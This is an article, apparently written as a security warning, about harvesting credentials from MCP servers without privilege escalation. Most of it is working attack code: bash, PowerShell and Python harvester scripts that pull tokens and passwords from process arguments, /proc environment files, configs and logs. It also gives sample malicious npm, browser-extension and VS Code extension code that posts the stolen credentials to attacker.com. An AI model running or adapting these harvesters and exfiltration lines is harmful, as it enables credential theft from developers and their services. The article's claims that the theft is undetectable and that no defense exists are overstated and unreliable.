# The "No Privilege Escalation Required" Attack: Trivial Credential Harvesting

## The Shocking Reality

> "But surely you need root/admin access to steal credentials?"

**NO.** With MCP's architecture, any code running as your user can harvest ALL credentials from ALL MCP servers. No privilege escalation. No exploits. Just reading your own processes.

## The Attack Surface

### What "No Privilege Escalation" Means

```bash
# You DON'T need:
- Root/Administrator access
- Special capabilities (CAP_SYS_PTRACE)
- Kernel exploits
- UAC bypass
- sudo privileges

# You ONLY need:
- Code execution as the same user
- Basic process enumeration
- File system read access (your own files)
```

## Trivial Credential Harvesting Techniques

### Technique 1: Process Command Line Arguments

```bash
# The simplest attack - reading process listings
ps aux | grep mcp

# Output:
alice 12345 0.1 0.5 python db-server.py postgresql://admin:SuperSecret123@prod-db:5432/customers
alice 12346 0.1 0.4 node github-mcp.js --token=ghp_ProductionTokenWithFullAccess
alice 12347 0.1 0.3 python slack-mcp.py --webhook=https://hooks.slack.com/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX
```

**Time to compromise: 0.1 seconds**

### Technique 2: Environment Variable Harvesting

```bash
# Read environment of any process you own
cat /proc/*/environ | tr '\0' '\n' | grep -E '(TOKEN|KEY|PASSWORD|SECRET)'

# Output:
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
GITHUB_TOKEN=ghp_1234567890ABCDEFghijKLMNopQRSTuvWXyz12
OPENAI_API_KEY=sk-proj-ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnop
SLACK_BOT_TOKEN=xoxb-12345678900-1234567890123-ABCdefGHIjklMNOpqrsTUVwx
STRIPE_SECRET_KEY=sk_live_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnop
```

**Time to compromise: 1 second**

### Technique 3: Configuration File Pillaging

```bash
# MCP servers store configs in predictable locations
find ~ -name "*mcp*" -o -name "*claude*" -o -name "config.json" 2>/dev/null

# Common locations:
~/.config/claude/config.json
~/.config/mcp/servers.json
~/.mcp/credentials.json
~/AppData/Roaming/Claude/config.json (Windows)

# Extract all credentials
cat ~/.config/*/config.json | jq -r '.. | select(type == "string") | select(test("token|key|password|secret"; "i"))'
```

**Time to compromise: 2 seconds**

### Technique 4: Memory Scanning Without Privileges

```bash
# On Linux - read your own process memory via /proc
cat /proc/$(pgrep mcp)/maps | grep heap
cat /proc/$(pgrep mcp)/mem 2>/dev/null | strings | grep -E "(password|token|key|secret)"

# On Windows - using PowerShell
Get-Process *mcp* | ForEach-Object {
    $_.Modules | Select-String -Pattern "token|password|key|secret"
}
```

### Technique 5: File Descriptor Snooping

```bash
# See what files/pipes MCP servers have open
ls -la /proc/$(pgrep mcp)/fd/

# Read from their STDIO pipes
tail -f /proc/$(pgrep mcp)/fd/1  # stdout
tail -f /proc/$(pgrep mcp)/fd/2  # stderr
```

### Technique 6: Log File Mining

```bash
# MCP servers often log sensitive data
grep -r "password\|token\|key\|secret" ~/.local/share/ 2>/dev/null
grep -r "postgresql://" ~/.cache/ 2>/dev/null

# Common log locations:
~/.local/share/claude/logs/
~/.cache/mcp/
/tmp/mcp-*.log
~/AppData/Local/Claude/logs/ (Windows)
```

## Real-World Attack Scenarios

### Scenario 1: The NPM Package Attack

```javascript
// Malicious code in any npm package
const { execSync } = require('child_process');

// Harvest all MCP credentials in 5 lines
const processes = execSync('ps aux').toString();
const mcpServers = processes.match(/mcp.*postgresql:\/\/[^\s]+/g);
const tokens = execSync('cat /proc/*/environ | strings').toString()
               .match(/(TOKEN|KEY)=[^\n]+/g);

// Exfiltrate
fetch('https://attacker.com/stolen', { 
    method: 'POST', 
    body: JSON.stringify({ mcpServers, tokens })
});
```

### Scenario 2: The Browser Extension Attack

```javascript
// Malicious browser extension
chrome.runtime.sendNativeMessage('com.attacker.helper', {
    cmd: 'harvest',
    script: `
        ps aux | grep mcp > /tmp/mcp-harvest.txt
        cat ~/.config/claude/config.json >> /tmp/mcp-harvest.txt
        curl -X POST https://attacker.com/upload -F file=@/tmp/mcp-harvest.txt
    `
});
```

### Scenario 3: The VS Code Extension Attack

```typescript
// Malicious VS Code extension
import * as vscode from 'vscode';
import { exec } from 'child_process';

export function activate(context: vscode.ExtensionContext) {
    // Triggered on any file save
    vscode.workspace.onDidSaveTextDocument(() => {
        // Harvest MCP credentials
        exec('ps aux | grep mcp', (err, stdout) => {
            const creds = stdout.match(/postgresql:\/\/[^\s]+/g);
            // Send home
            require('https').request({
                hostname: 'attacker.com',
                path: '/vscode-harvest',
                method: 'POST'
            }).end(JSON.stringify(creds));
        });
    });
}
```

## Platform-Specific Harvesting

### Linux: Everything is a File

```bash
#!/bin/bash
# Complete MCP credential harvester for Linux

echo "[*] Harvesting MCP credentials (no root required)..."

# 1. Process arguments
ps aux | grep -E "(mcp|claude)" | grep -vE "(grep|harvester)" > creds.txt

# 2. Environment variables  
for pid in $(pgrep -f mcp); do
    cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | \
        grep -E "(TOKEN|KEY|PASS|SECRET)=" >> creds.txt
done

# 3. Config files
find ~ -type f -name "*.json" -path "*claude*" -o -path "*mcp*" \
    -exec grep -l "token\|password\|key" {} \; | \
    xargs cat >> creds.txt 2>/dev/null

# 4. Recently accessed files
lsof -u $USER | grep -E "(mcp|claude)" | awk '{print $9}' | \
    xargs cat 2>/dev/null | grep -E "(token|password|key)" >> creds.txt

echo "[+] Harvested $(wc -l < creds.txt) potential credentials"
```

### Windows: PowerShell Power

```powershell
# Complete MCP credential harvester for Windows

Write-Host "[*] Harvesting MCP credentials (no admin required)..."

# 1. Process command lines via WMI
$creds = @()
Get-WmiObject Win32_Process | Where-Object { 
    $_.CommandLine -match "mcp|claude" 
} | ForEach-Object {
    $creds += $_.CommandLine
}

# 2. Environment variables
Get-Process | Where-Object { $_.ProcessName -match "mcp" } | ForEach-Object {
    $_.StartInfo.EnvironmentVariables.GetEnumerator() | Where-Object {
        $_.Key -match "TOKEN|KEY|PASSWORD|SECRET"
    } | ForEach-Object {
        $creds += "$($_.Key)=$($_.Value)"
    }
}

# 3. Config files
Get-ChildItem -Path $env:USERPROFILE -Recurse -Filter "*.json" -ErrorAction SilentlyContinue |
    Select-String -Pattern "token|password|key|secret" | ForEach-Object {
        $creds += $_.Line
    }

# 4. Registry (MCP might store config here)
Get-ChildItem "HKCU:\Software" -Recurse -ErrorAction SilentlyContinue |
    Get-ItemProperty | Where-Object {
        $_ -match "mcp|claude"
    } | ForEach-Object {
        $creds += $_
    }

Write-Host "[+] Harvested $($creds.Count) potential credentials"
$creds | Out-File -FilePath "$env:TEMP\mcp-harvest.txt"
```

### macOS: The Keychain Isn't Involved

```bash
#!/bin/bash
# macOS specific harvesting

echo "[*] Harvesting MCP credentials on macOS..."

# 1. Standard process/env harvesting works the same
ps aux | grep -E "(mcp|claude)" > creds.txt
cat /proc/*/environ 2>/dev/null | strings | grep -E "(TOKEN|KEY)=" >> creds.txt

# 2. macOS specific locations
find ~/Library/Application\ Support -name "*claude*" -o -name "*mcp*" | \
    xargs grep -h "token\|password\|key" 2>/dev/null >> creds.txt

# 3. Launch agents might have creds
grep -r "EnvironmentVariables" ~/Library/LaunchAgents | \
    grep -E "(TOKEN|KEY|PASS)" >> creds.txt

# Note: Keychain is NOT used by MCP (that would be secure!)
echo "[!] MCP doesn't use Keychain, credentials are in plaintext"
```

## The Speed of Compromise

### Automated Harvesting Timeline

```
T+0ms    - Malicious code executes
T+10ms   - Process enumeration complete  
T+50ms   - Command line credentials extracted
T+100ms  - Environment variables harvested
T+200ms  - Configuration files located
T+500ms  - All credentials extracted
T+1000ms - Credentials exfiltrated

Total: 1 second from execution to complete compromise
```

### Scale of Automated Attacks

```yaml
Single Developer Machine:
  - MCP Servers: 5-10
  - Credentials Exposed: 10-50
  - Services Compromised: 5-20
  
Small Team (10 developers):
  - MCP Servers: 50-100
  - Credentials Exposed: 100-500
  - Services Compromised: 20-50

Enterprise (1000 developers):
  - MCP Servers: 5,000-10,000
  - Credentials Exposed: 10,000-50,000
  - Services Compromised: 100-500
  - Time to compromise all: < 1 hour
```

## Why This Is Catastrophic

### 1. No Special Access Required
- Any malware/script with user-level access succeeds
- No alerts triggered (reading your own processes)
- No security software stops this

### 2. Credentials Are Everywhere
- Command line arguments (ps)
- Environment variables (/proc)
- Config files (JSON)
- Process memory
- Log files

### 3. It's Not Detectable
- Looks like normal process inspection
- No privileged operations
- No suspicious network traffic (initially)
- No system calls that trigger alerts

### 4. Cross-Platform Universal
- Works on Linux, macOS, Windows
- No platform-specific exploits needed
- Same techniques work everywhere

## The "Security Theater" Response

### What Doesn't Work

❌ **"We have EDR/AV"**
- This isn't malware, it's reading processes
- EDR allows users to read their own data

❌ **"We use application whitelisting"**
- `ps`, `cat`, `/proc` access are all legitimate
- Can be done from any approved scripting language

❌ **"We have DLP"**
- DLP watches data leaving, not being collected
- By then it's too late

❌ **"We audit everything"**
- Audit logs show: "User alice read alice's processes"
- Nothing suspicious to flag

### The Ugly Truth

**There is no defense against same-user credential harvesting in MCP's current architecture.**

The only solution is to not use MCP with production credentials.

## Demonstration Code

### Complete Harvester in 20 Lines

```python
#!/usr/bin/env python3
import os
import subprocess
import json
import glob

# Harvest everything
creds = []

# Process arguments
ps_output = subprocess.check_output(['ps', 'aux']).decode()
creds.extend([line for line in ps_output.split('\n') if 'mcp' in line])

# Environment variables
for env_file in glob.glob('/proc/*/environ'):
    try:
        with open(env_file, 'rb') as f:
            creds.extend([line for line in f.read().decode('utf-8', errors='ignore').split('\0') 
                         if any(key in line for key in ['TOKEN', 'KEY', 'PASS', 'SECRET'])])
    except:
        pass

# Config files
for config in glob.glob(os.path.expanduser('~/.config/**/config.json'), recursive=True):
    try:
        with open(config) as f:
            data = f.read()
            if any(key in data.lower() for key in ['token', 'password', 'key', 'secret']):
                creds.append(f"Config: {config}\n{data}")
    except:
        pass

# Output
print(f"[+] Harvested {len(creds)} credentials without privilege escalation")
for cred in creds[:10]:  # First 10
    print(f"  - {cred[:100]}...")
```

## Conclusion

MCP's architecture makes credential harvesting trivial:
- No privilege escalation required
- Multiple harvesting vectors
- Cross-platform techniques
- Undetectable by security tools
- Automatable at scale

This isn't a vulnerability that can be patched. It's the fundamental consequence of running everything as the same user with credentials in process memory, environment variables, and command lines.

**The math is simple**: Same User + Plaintext Credentials = Inevitable Compromise

---

*"The easiest privilege escalation is when you don't need any."*